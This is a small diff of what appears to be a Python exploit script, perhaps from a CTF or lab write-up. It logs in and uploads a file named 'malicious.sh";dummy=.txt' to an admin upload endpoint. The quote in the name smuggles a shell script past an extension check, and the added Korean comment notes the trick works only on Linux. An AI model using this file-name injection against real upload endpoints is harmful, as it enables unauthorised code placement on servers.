@@ -18,7 +18,7 @@ session.post(f"{URL}/auth/login",json=login)
 
 # 1. Upload File
 
-with open('./malicious.sh";dummy=.txt','rb') as f:
+with open('./malicious.sh";dummy=.txt','rb') as f: # 리눅스에서만 가능 (Windows에서는 파일 이름에 " 포함 불가)
     upload = {'file' : f}
     res = session.post(f"{URL}/admin/upload",headers=headers,files=upload)
 
